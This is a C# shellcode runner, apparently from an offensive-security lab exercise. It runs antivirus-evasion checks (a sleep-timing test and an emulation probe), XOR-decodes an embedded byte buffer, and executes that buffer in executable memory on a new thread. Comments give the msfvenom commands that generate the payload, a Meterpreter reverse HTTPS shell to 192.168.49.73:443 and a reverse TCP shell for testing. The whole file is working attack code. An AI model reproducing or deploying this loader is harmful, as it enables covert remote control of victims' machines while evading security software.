using System;
using System.Runtime.InteropServices;


namespace shellcode_runner_simple
{
    class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);


        static void Main(string[] args)
        {

            // AV bypass

            // sleep for 10 seconds

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // Check for non-emulated APIs

            IntPtr flsresult = FlsAlloc(IntPtr.Zero);
            if (flsresult == null)
            {
                return;
            }



            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.73 LPORT=443 EXITFUNC=thread -f csharp --arch x64 --platform windows
            // for testing:
            // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f csharp --arch x64 --platform windows
            // XORed with key - 0xbb


            byte[] buf = new byte[460] { 0x47, 0xf3, 0x38, 0x5f, 0x4b, 0x53, 0x7b, 0xbb, 0xbb, 0xbb, 0xfa, 0xea, 0xfa, 0xeb, 0xe9, 0xea, 0xed, 0xf3, 0x8a, 0x69, 0xde, 0xf3, 0x30, 0xe9, 0xdb, 0xf3, 0x30, 0xe9, 0xa3, 0xf3, 0x30, 0xe9, 0x9b, 0xf3, 0x30, 0xc9, 0xeb, 0xf3, 0xb4, 0x0c, 0xf1, 0xf1, 0xf6, 0x8a, 0x72, 0xf3, 0x8a, 0x7b, 0x17, 0x87, 0xda, 0xc7, 0xb9, 0x97, 0x9b, 0xfa, 0x7a, 0x72, 0xb6, 0xfa, 0xba, 0x7a, 0x59, 0x56, 0xe9, 0xfa, 0xea, 0xf3, 0x30, 0xe9, 0x9b, 0x30, 0xf9, 0x87, 0xf3, 0xba, 0x6b, 0x30, 0x3b, 0x33, 0xbb, 0xbb, 0xbb, 0xf3, 0x3e, 0x7b, 0xcf, 0xdc, 0xf3, 0xba, 0x6b, 0xeb, 0x30, 0xf3, 0xa3, 0xff, 0x30, 0xfb, 0x9b, 0xf2, 0xba, 0x6b, 0x58, 0xed, 0xf3, 0x44, 0x72, 0xfa, 0x30, 0x8f, 0x33, 0xf3, 0xba, 0x6d, 0xf6, 0x8a, 0x72, 0xf3, 0x8a, 0x7b, 0x17, 0xfa, 0x7a, 0x72, 0xb6, 0xfa, 0xba, 0x7a, 0x83, 0x5b, 0xce, 0x4a, 0xf7, 0xb8, 0xf7, 0x9f, 0xb3, 0xfe, 0x82, 0x6a, 0xce, 0x63, 0xe3, 0xff, 0x30, 0xfb, 0x9f, 0xf2, 0xba, 0x6b, 0xdd, 0xfa, 0x30, 0xb7, 0xf3, 0xff, 0x30, 0xfb, 0xa7, 0xf2, 0xba, 0x6b, 0xfa, 0x30, 0xbf, 0x33, 0xf3, 0xba, 0x6b, 0xfa, 0xe3, 0xfa, 0xe3, 0xe5, 0xe2, 0xe1, 0xfa, 0xe3, 0xfa, 0xe2, 0xfa, 0xe1, 0xf3, 0x38, 0x57, 0x9b, 0xfa, 0xe9, 0x44, 0x5b, 0xe3, 0xfa, 0xe2, 0xe1, 0xf3, 0x30, 0xa9, 0x52, 0xec, 0x44, 0x44, 0x44, 0xe6, 0xf2, 0x05, 0xcc, 0xc8, 0x89, 0xe4, 0x88, 0x89, 0xbb, 0xbb, 0xfa, 0xed, 0xf2, 0x32, 0x5d, 0xf3, 0x3a, 0x57, 0x1b, 0xba, 0xbb, 0xbb, 0xf2, 0x32, 0x5e, 0xf2, 0x07, 0xb9, 0xbb, 0xaa, 0xe7, 0xc4, 0xbb, 0xbb, 0xba, 0xfa, 0xef, 0xf2, 0x32, 0x5f, 0xf7, 0x32, 0x4a, 0xfa, 0x01, 0xf7, 0xcc, 0x9d, 0xbc, 0x44, 0x6e, 0xf7, 0x32, 0x51, 0xd3, 0xba, 0xba, 0xbb, 0xbb, 0xe2, 0xfa, 0x01, 0x92, 0x3b, 0xd0, 0xbb, 0x44, 0x6e, 0xeb, 0xeb, 0xf6, 0x8a, 0x72, 0xf6, 0x8a, 0x7b, 0xf3, 0x44, 0x7b, 0xf3, 0x32, 0x79, 0xf3, 0x44, 0x7b, 0xf3, 0x32, 0x7a, 0xfa, 0x01, 0x51, 0xb4, 0x64, 0x5b, 0x44, 0x6e, 0xf3, 0x32, 0x7c, 0xd1, 0xab, 0xfa, 0xe3, 0xf7, 0x32, 0x59, 0xf3, 0x32, 0x42, 0xfa, 0x01, 0x22, 0x1e, 0xcf, 0xda, 0x44, 0x6e, 0xf3, 0x3a, 0x7f, 0xfb, 0xb9, 0xbb, 0xbb, 0xf2, 0x03, 0xd8, 0xd6, 0xdf, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xfa, 0xeb, 0xfa, 0xeb, 0xf3, 0x32, 0x59, 0xec, 0xec, 0xec, 0xf6, 0x8a, 0x7b, 0xd1, 0xb6, 0xe2, 0xfa, 0xeb, 0x59, 0x47, 0xdd, 0x7c, 0xff, 0x9f, 0xef, 0xba, 0xba, 0xf3, 0x36, 0xff, 0x9f, 0xa3, 0x7d, 0xbb, 0xd3, 0xf3, 0x32, 0x5d, 0xed, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0xf2, 0x44, 0x7b, 0xfa, 0xeb, 0xf2, 0x44, 0x73, 0xf6, 0x32, 0x7a, 0xf7, 0x32, 0x7a, 0xfa, 0x01, 0xc2, 0x77, 0x84, 0x3d, 0x44, 0x6e, 0xf3, 0x8a, 0x69, 0xf3, 0x44, 0x71, 0x30, 0xb5, 0xfa, 0x01, 0xb3, 0x3c, 0xa6, 0xdb, 0x44, 0x6e, 0x00, 0x5b, 0xa6, 0x91, 0xb1, 0xfa, 0x01, 0x1d, 0x2e, 0x06, 0x26, 0x44, 0x6e, 0xf3, 0x38, 0x7f, 0x93, 0x87, 0xbd, 0xc7, 0xb1, 0x3b, 0x40, 0x5b, 0xce, 0xbe, 0x00, 0xfc, 0xa8, 0xc9, 0xd4, 0xd1, 0xbb, 0xe2, 0xfa, 0x32, 0x61, 0x44, 0x6e };

            // XORed - key: 0xbb
            
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xbb);
            }
           

            uint size = (uint)buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, size, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, (int)size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}

